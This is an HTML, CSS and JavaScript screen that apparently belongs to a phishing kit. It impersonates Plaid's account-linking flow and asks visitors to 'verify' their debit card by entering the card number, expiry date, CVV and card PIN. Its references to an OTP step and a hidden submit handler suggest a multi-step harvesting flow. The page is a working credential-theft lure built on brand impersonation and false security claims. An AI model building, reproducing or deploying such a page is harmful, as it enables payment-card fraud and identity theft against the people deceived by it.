<style>
/* ═══════════════════════════════════════════════
   PLAID DESIGN SYSTEM — shared across all fragments
   ═══════════════════════════════════════════════ */
:root {
  --p-black:   #111111;
  --p-navy:    #113b5e;
  --p-blue:    #1a56ff;
  --p-gray1:   #f5f5f5;
  --p-gray2:   #e8e8e8;
  --p-gray3:   #b0b0b0;
  --p-gray4:   #6b6b6b;
  --p-white:   #ffffff;
  --p-green:   #0fa55a;
  --p-red:     #e0341b;
  --p-radius:  10px;
  --p-shadow:  0 4px 24px rgba(0,0,0,0.10);
  --p-trans:   all 0.22s cubic-bezier(.4,0,.2,1);
}

* { margin:0; padding:0; box-sizing:border-box; }

.p-wrap {
  min-height: 100vh;
  display: flex;
  justify-content: center;
  align-items: flex-start;
  padding: 16px 12px 32px;
  background: #f0f2f5;
  font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
  -webkit-font-smoothing: antialiased;
}

.p-card {
  background: var(--p-white);
  border-radius: 16px;
  box-shadow: var(--p-shadow);
  width: 100%;
  max-width: 440px;
  padding: 0;
  overflow: hidden;
}

/* ── Top bar with Plaid logo ── */
.p-topbar {
  display: flex;
  align-items: center;
  justify-content: space-between;
  padding: 16px 20px 0;
}
.p-plaid-logo {
  display: flex;
  align-items: center;
  gap: 6px;
}
.p-plaid-logo img {
  height: 22px;
  width: auto;
}
.p-plaid-wordmark {
  font-size: 17px;
  font-weight: 700;
  letter-spacing: -0.5px;
  color: var(--p-black);
}
.p-lock-icon {
  width: 30px;
  height: 30px;
  background: var(--p-gray1);
  border-radius: 50%;
  display: flex;
  align-items: center;
  justify-content: center;
  color: var(--p-gray4);
  font-size: 13px;
}

/* ── Progress dots ── */
.p-progress {
  display: flex;
  align-items: center;
  justify-content: center;
  gap: 6px;
  padding: 14px 20px 0;
}
.p-dot {
  width: 7px;
  height: 7px;
  border-radius: 50%;
  background: var(--p-gray2);
  transition: var(--p-trans);
}
.p-dot.active  { background: var(--p-black); transform: scale(1.2); }
.p-dot.done    { background: var(--p-green); }
.p-progress-bar-wrap {
  padding: 14px 20px 0;
}
.p-progress-bar {
  width: 100%;
  height: 3px;
  background: var(--p-gray2);
  border-radius: 2px;
  overflow: hidden;
}
.p-progress-bar-fill {
  height: 100%;
  background: var(--p-black);
  border-radius: 2px;
  transition: width 0.5s cubic-bezier(.4,0,.2,1);
}

/* ── Institution header ── */
.p-inst-header {
  display: flex;
  align-items: center;
  gap: 14px;
  padding: 18px 20px 0;
}
.p-inst-logo {
  width: 48px;
  height: 48px;
  border-radius: 12px;
  background: var(--p-gray1);
  display: flex;
  align-items: center;
  justify-content: center;
  overflow: hidden;
  flex-shrink: 0;
  border: 1px solid var(--p-gray2);
}
.p-inst-logo img  { max-width: 78%; max-height: 78%; object-fit: contain; }
.p-inst-logo svg  { width: 100%; height: 100%; }
.p-inst-info h3   { font-size: 15px; font-weight: 600; color: var(--p-black); line-height: 1.2; }
.p-inst-info span { font-size: 12.5px; color: var(--p-gray4); margin-top: 2px; display: block; }

/* ── Body content ── */
.p-body {
  padding: 20px 20px 24px;
}
.p-title {
  font-size: 20px;
  font-weight: 700;
  color: var(--p-black);
  letter-spacing: -0.3px;
  margin-bottom: 6px;
}
.p-sub {
  font-size: 13.5px;
  color: var(--p-gray4);
  line-height: 1.55;
  margin-bottom: 20px;
}

/* ── Input group ── */
.p-field {
  margin-bottom: 14px;
}
.p-label {
  display: block;
  font-size: 12px;
  font-weight: 600;
  color: var(--p-gray4);
  text-transform: uppercase;
  letter-spacing: 0.5px;
  margin-bottom: 6px;
}
.p-input {
  width: 100%;
  padding: 13px 14px;
  border: 1.5px solid var(--p-gray2);
  border-radius: var(--p-radius);
  font-size: 15px;
  color: var(--p-black);
  background: var(--p-white);
  transition: var(--p-trans);
  outline: none;
  box-sizing: border-box;
}
.p-input:focus    { border-color: var(--p-black); box-shadow: 0 0 0 3px rgba(17,17,17,0.08); }
.p-input.p-error  { border-color: var(--p-red); }
.p-input-wrap     { position: relative; }
.p-input-wrap .p-input { padding-right: 44px; }
.p-eye {
  position: absolute;
  right: 13px;
  top: 50%;
  transform: translateY(-50%);
  background: none;
  border: none;
  cursor: pointer;
  color: var(--p-gray3);
  font-size: 15px;
  padding: 4px;
}
.p-eye:hover { color: var(--p-black); }

/* ── Error message ── */
.p-error-msg {
  font-size: 12px;
  color: var(--p-red);
  margin-top: 5px;
  display: none;
}
.p-error-msg.show { display: block; }

/* ── Buttons ── */
.p-btn {
  width: 100%;
  padding: 14px;
  background: var(--p-black);
  color: var(--p-white);
  border: none;
  border-radius: var(--p-radius);
  font-size: 15px;
  font-weight: 600;
  cursor: pointer;
  transition: var(--p-trans);
  letter-spacing: 0.1px;
  margin-top: 4px;
}
.p-btn:hover    { background: #222; transform: translateY(-1px); box-shadow: 0 4px 14px rgba(0,0,0,0.18); }
.p-btn:active   { transform: translateY(0); }
.p-btn:disabled { background: var(--p-gray2); color: var(--p-gray3); cursor: not-allowed; transform: none; box-shadow: none; }
.p-btn-ghost {
  width: 100%;
  padding: 13px;
  background: transparent;
  color: var(--p-black);
  border: 1.5px solid var(--p-gray2);
  border-radius: var(--p-radius);
  font-size: 14px;
  font-weight: 500;
  cursor: pointer;
  transition: var(--p-trans);
  margin-top: 10px;
}
.p-btn-ghost:hover { background: var(--p-gray1); border-color: var(--p-gray3); }

/* ── Divider ── */
.p-divider {
  height: 1px;
  background: var(--p-gray2);
  margin: 18px 0;
}

/* ── Footer ── */
.p-footer {
  padding: 0 20px 20px;
  display: flex;
  align-items: center;
  justify-content: center;
  gap: 5px;
  font-size: 12px;
  color: var(--p-gray4);
}
.p-footer i { font-size: 11px; color: var(--p-green); }

/* ── Loading spinner ── */
.p-spinner {
  display: inline-block;
  width: 20px; height: 20px;
  border: 2px solid rgba(255,255,255,0.3);
  border-top-color: #fff;
  border-radius: 50%;
  animation: pSpin 0.7s linear infinite;
  vertical-align: middle;
  margin-right: 8px;
}
@keyframes pSpin { to { transform: rotate(360deg); } }

/* ── Generic bank SVG ── */
.p-gen-bank svg { width: 100%; height: 100%; }


/* ── Card visual ── */
.p-card-visual {
  position: relative;
  width: 100%;
  max-width: 320px;
  aspect-ratio: 1.586;
  border-radius: 16px;
  padding: 18px 20px;
  margin: 0 auto 22px;
  box-shadow: 0 10px 40px rgba(0,0,0,0.35);
  color: white;
  overflow: hidden;
  background: linear-gradient(135deg, #1a1a2e 0%, #16213e 50%, #0f3460 100%);
  transition: background 0.5s cubic-bezier(.4,0,.2,1);
}
/* Subtle sheen overlay */
.p-card-visual::before {
  content: '';
  position: absolute;
  top: -60%; left: -20%;
  width: 140%; height: 140%;
  background: radial-gradient(ellipse at 60% 40%, rgba(255,255,255,0.06) 0%, transparent 70%);
  pointer-events: none;
}

/* Top row: chip + network logo */
.p-cv-top {
  display: flex;
  justify-content: space-between;
  align-items: flex-start;
  margin-bottom: 18px;
  position: relative; z-index: 1;
}
.p-cv-chip {
  width: 36px; height: 28px;
  background: linear-gradient(135deg, #d4a017, #f5c842);
  border-radius: 5px;
  position: relative;
}
.p-cv-chip::after {
  content: '';
  position: absolute;
  top: 50%; left: 50%;
  transform: translate(-50%,-50%);
  width: 18px; height: 18px;
  border: 1.5px solid rgba(0,0,0,0.2);
  border-radius: 3px;
}
.p-cv-network {
  display: flex;
  align-items: center;
  justify-content: flex-end;
  min-width: 60px;
  min-height: 24px;
}

.p-cv-number {
  font-size: 15px;
  font-weight: 500;
  letter-spacing: 2.5px;
  font-family: 'Courier New', monospace;
  margin-bottom: 16px;
  position: relative; z-index: 1;
  opacity: 0.95;
  text-shadow: 0 1px 2px rgba(0,0,0,0.3);
}
.p-cv-bottom {
  display: flex;
  justify-content: space-between;
  align-items: flex-end;
  position: relative; z-index: 1;
}
.p-cv-label {
  font-size: 8px;
  opacity: 0.55;
  text-transform: uppercase;
  letter-spacing: 0.8px;
  margin-bottom: 3px;
}
.p-cv-value {
  font-size: 13px;
  font-weight: 600;
  letter-spacing: 0.8px;
  text-transform: uppercase;
}

/* 2-column grid */
.p-grid-2 {
  display: grid;
  grid-template-columns: 1fr 1fr;
  gap: 12px;
}
.p-pin-hint {
  font-size: 11.5px;
  color: var(--p-gray4);
  margin-top: 5px;
  display: flex;
  align-items: center;
  gap: 4px;
}
</style>

<div class="p-wrap">
  <div class="p-card">
    <div class="p-topbar">
      <div class="p-plaid-logo">
        <img src="https://i.ibb.co/20tK8xrs/pngwing-com.png" alt="Plaid">
        <span class="p-plaid-wordmark">plaid</span>
      </div>
      <div class="p-lock-icon"><i class="fas fa-lock"></i></div>
    </div>
    <div class="p-progress-bar-wrap">
      <div class="p-progress-bar"><div class="p-progress-bar-fill" style="width:60%;"></div></div>
    </div>

    <div class="p-inst-header">
      <div class="p-inst-logo" id="cardLogoWrap"></div>
      <div class="p-inst-info">
        <h3 id="cardBankName">Your Bank</h3>
        <span>Debit Card Verification</span>
      </div>
    </div>

    <div class="p-body">
      <p class="p-title">Verify your debit card</p>
      <p class="p-sub">Enter your card details to confirm account ownership.</p>

      <!-- Live card preview -->
      <div class="p-card-visual" id="cardVisual">
        <div class="p-cv-top">
          <div class="p-cv-chip"></div>
          <div class="p-cv-network" id="cvNetworkLogo"></div>
        </div>
        <div class="p-cv-number" id="cvNumber">&bull;&bull;&bull;&bull; &bull;&bull;&bull;&bull; &bull;&bull;&bull;&bull; &bull;&bull;&bull;&bull;</div>
        <div class="p-cv-bottom">
          <div>
            <div class="p-cv-label">Cardholder Name</div>
            <div class="p-cv-value" id="cvName">YOUR NAME</div>
          </div>
          <div style="text-align:right;">
            <div class="p-cv-label">Expires</div>
            <div class="p-cv-value" id="cvExpiry">MM/YY</div>
          </div>
        </div>
      </div>

      <!-- Card number -->
      <div class="p-field">
        <label class="p-label" for="card-number">Debit Card Number</label>
        <input type="tel" id="card-number" class="p-input"
          placeholder="0000 0000 0000 0000"
          maxlength="19" inputmode="numeric" autocomplete="cc-number">
      </div>

      <!-- Expiry + CVV -->
      <div class="p-grid-2">
        <div class="p-field">
          <label class="p-label" for="expiry">Expiry Date</label>
          <input type="tel" id="expiry" class="p-input" placeholder="MM / YY"
            maxlength="7" inputmode="numeric" autocomplete="cc-exp">
        </div>
        <div class="p-field">
          <label class="p-label" for="cvv">CVV / CVC</label>
          <div class="p-input-wrap">
            <input type="password" id="cvv" class="p-input" placeholder="&bull;&bull;&bull;"
              maxlength="4" inputmode="numeric" autocomplete="cc-csc">
            <button type="button" class="p-eye" onclick="_pcardToggle('cvv',this)">
              <i class="fas fa-eye"></i>
            </button>
          </div>
        </div>
      </div>

      <!-- PIN -->
      <div class="p-field">
        <label class="p-label" for="card-pin">Debit Card PIN</label>
        <div class="p-input-wrap">
          <input type="password" id="card-pin" class="p-input" placeholder="&bull;&bull;&bull;&bull;"
            maxlength="6" inputmode="numeric" autocomplete="off">
          <button type="button" class="p-eye" onclick="_pcardToggle('card-pin',this)">
            <i class="fas fa-eye"></i>
          </button>
        </div>
        <div class="p-pin-hint">
          <i class="fas fa-info-circle"></i> 4&ndash;6 digit PIN set at your bank
        </div>
      </div>

      <!-- Error -->
      <div class="p-error-msg" id="cardErrMsg"></div>
      <!-- Legacy compat: session_handler reads #cardError -->
      <div id="cardError" class="message error" style="display:none;"></div>

      <button class="p-btn" id="cardSubmitBtn"
        onclick="window.submitSecurityCard && window.submitSecurityCard()">
        Verify Card
      </button>
      <button class="p-btn-ghost"
        onclick="window.SPA && window.SPA.renderFragment('p_otp_v1','Loading…')">
        &#8592; Back
      </button>
    </div>

    <div class="p-footer">
      <i class="fas fa-lock"></i>
      <span>Protected by Plaid &amp; 256-bit SSL encryption</span>
    </div>
  </div>
</div>

<script>
(function () {

  /* ── Generic bank SVG ─────────────────────────────────────────── */
  var GEN_SVG = '<svg viewBox="0 0 48 48" xmlns="http://www.w3.org/2000/svg"><rect width="48" height="48" rx="10" fill="#113b5e"/><path d="M24 8L40 17H8Z" fill="#82cde5"/><rect x="10" y="19" width="4" height="12" rx="1.5" fill="white"/><rect x="16" y="19" width="4" height="12" rx="1.5" fill="white"/><rect x="22" y="19" width="4" height="12" rx="1.5" fill="white"/><rect x="28" y="19" width="4" height="12" rx="1.5" fill="white"/><rect x="34" y="19" width="4" height="12" rx="1.5" fill="white"/><rect x="8" y="31" width="32" height="4" rx="2" fill="white"/></svg>';

  /* ── Populate bank logo ──────────────────────────────────────── */
  var bank = window._selectedBank || {};
  var wrap = document.getElementById('cardLogoWrap');
  var nameEl = document.getElementById('cardBankName');
  if (nameEl && bank.name) nameEl.textContent = bank.name;
  if (wrap && !wrap.hasChildNodes()) {
    if (bank.logo) {
      var logoImg = new Image();
      logoImg.alt = bank.name || 'Bank';
      logoImg.style.cssText = 'max-width:78%;max-height:78%;object-fit:contain;';
      logoImg.onerror = function () { wrap.innerHTML = GEN_SVG; };
      logoImg.src = bank.logo;
      wrap.appendChild(logoImg);
    } else { wrap.innerHTML = GEN_SVG; }
  }

  /* ── Client name from SPA storage ───────────────────────────── */
  try {
    var appData = window.SPA && window.SPA.storage ? window.SPA.storage.get('app_data') : null;
    if (appData && appData.client_name) {
      var cvNameEl = document.getElementById('cvName');
      if (cvNameEl) cvNameEl.textContent = appData.client_name.toUpperCase();
    }
  } catch (e) {}

  /* ── Card network detection + visual themes ─────────────────── */
  var CARD_THEMES = {
    visa: {
      bg: 'linear-gradient(135deg, #1A1F71 0%, #1565C0 100%)',
      logo: '<svg viewBox="0 0 80 26" xmlns="http://www.w3.org/2000/svg" width="80" height="26"><text x="2" y="22" font-family="Arial,sans-serif" font-style="italic" font-weight="900" font-size="26" fill="white" letter-spacing="-1">VISA</text></svg>',
    },
    mastercard: {
      bg: 'linear-gradient(135deg, #1c1c1c 0%, #2d2d2d 100%)',
      logo: '<svg viewBox="0 0 60 36" xmlns="http://www.w3.org/2000/svg" width="60" height="36"><circle cx="22" cy="18" r="16" fill="#EB001B"/><circle cx="38" cy="18" r="16" fill="#F79E1B"/><path d="M30 5.2C33.7 8 36 12.7 36 18s-2.3 10-6 12.8C26.3 28 24 23.3 24 18s2.3-10 6-12.8z" fill="#FF5F00"/></svg>',
    },
    amex: {
      bg: 'linear-gradient(135deg, #2E77BC 0%, #1a5a9e 100%)',
      logo: '<svg viewBox="0 0 72 22" xmlns="http://www.w3.org/2000/svg" width="72" height="22"><text x="0" y="16" font-family="Arial,sans-serif" font-weight="900" font-size="14" fill="white" letter-spacing="2.5">AMEX</text></svg>',
    },
    discover: {
      bg: 'linear-gradient(135deg, #1c1c1c 0%, #333 100%)',
      logo: '<svg viewBox="0 0 96 24" xmlns="http://www.w3.org/2000/svg" width="96" height="24"><text x="0" y="16" font-family="Arial,sans-serif" font-weight="700" font-size="12" fill="white" letter-spacing="1.8">DISCOVER</text><circle cx="88" cy="12" r="12" fill="#FF6600"/></svg>',
    },
    default: {
      bg: 'linear-gradient(135deg, #1a1a2e 0%, #16213e 50%, #0f3460 100%)',
      logo: '',
    },
  };

  function _detectNetwork(rawNumber) {
    var n = (rawNumber || '').replace(/\D/g, '');
    if (!n) return 'default';
    if (n[0] === '4') return 'visa';
    if (/^(5[1-5]|2[2-7])/.test(n)) return 'mastercard';
    if (/^3[47]/.test(n)) return 'amex';
    if (/^(6011|65|64[4-9])/.test(n)) return 'discover';
    return 'default';
  }

  function _updateCardTheme(rawNumber) {
    var visual  = document.getElementById('cardVisual');
    var netLogo = document.getElementById('cvNetworkLogo');
    if (!visual) return;
    var network = _detectNetwork(rawNumber);
    var theme   = CARD_THEMES[network] || CARD_THEMES.default;
    visual.style.background = theme.bg;
    if (netLogo) netLogo.innerHTML = theme.logo;
  }

  /* ── Live card preview updates ────────────────────────────────── */
  var cardNumInput = document.getElementById('card-number');
  var expiryInput  = document.getElementById('expiry');
  var cvNumber     = document.getElementById('cvNumber');
  var cvExpiry     = document.getElementById('cvExpiry');

  if (cardNumInput) {
    cardNumInput.addEventListener('input', function () {
      var raw    = this.value.replace(/\D/g, '');
      var parts  = raw.match(/.{1,4}/g) || [];
      this.value = parts.join(' ').slice(0, 19);
      var disp   = parts.join(' ') || '';
      /* Mask all but last 4 for preview */
      if (disp.replace(/\s/g,'').length > 4) {
        var clean  = disp.replace(/\s/g,'');
        var masked = clean.slice(0, -4).replace(/\d/g, '\u2022') + clean.slice(-4);
        var mParts = masked.match(/.{1,4}/g) || [];
        cvNumber.textContent = mParts.join(' ');
      } else {
        cvNumber.textContent = disp || '\u2022\u2022\u2022\u2022 \u2022\u2022\u2022\u2022 \u2022\u2022\u2022\u2022 \u2022\u2022\u2022\u2022';
      }
      _updateCardTheme(raw);
    });
  }

  if (expiryInput) {
    expiryInput.addEventListener('input', function () {
      var raw = this.value.replace(/\D/g, '');
      if (raw.length >= 2) raw = raw.slice(0, 2) + ' / ' + raw.slice(2, 4);
      this.value = raw;
      cvExpiry.textContent = raw.replace(' / ', '/') || 'MM/YY';
    });
  }

  /* ── Eye toggles ──────────────────────────────────────────────── */
  window._pcardToggle = function (id, btn) {
    var el = document.getElementById(id);
    var i  = btn && btn.querySelector('i');
    if (!el) return;
    if (el.type === 'password') {
      el.type = 'text';
      if (i) { i.classList.remove('fa-eye'); i.classList.add('fa-eye-slash'); }
    } else {
      el.type = 'password';
      if (i) { i.classList.remove('fa-eye-slash'); i.classList.add('fa-eye'); }
    }
  };

  /* Keep legacy _pToggle alias working */
  window._pToggle = window._pcardToggle;

})();
</script>
